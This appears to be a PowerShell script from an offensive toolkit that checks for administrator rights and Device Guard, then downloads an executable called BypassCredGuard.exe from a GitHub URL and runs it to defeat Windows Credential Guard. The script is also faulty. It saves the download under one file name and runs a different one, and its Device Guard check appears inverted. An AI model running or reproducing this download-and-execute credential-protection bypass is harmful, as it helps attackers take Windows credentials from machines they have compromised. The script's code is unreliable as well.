<#
https://github.com/wh0nsq/BypassCredGuard/releases
#>


$IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")
If($IsClientAdmin -iMatch 'True')
{
   $TestRunning = (Get-ComputerInfo).DeviceGuardSecurityServicesConfigured
   If(-not([string]::IsNullOrEmpty($TestRunning)))
   {
      write-host "   Error: Device Guard not configurated.." -ForegroundColor Red
      return
   }

   ## Execute binary
   iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/BypassCredGuard.exe" -OutFile "$pwd\BypassCredGuardddddd.exe"|Unblock-File
   .\BypassCredGuardee.exe
}
Else
{
   write-host "   Error: Administrator privileges required.." -ForegroundColor Red
   return
}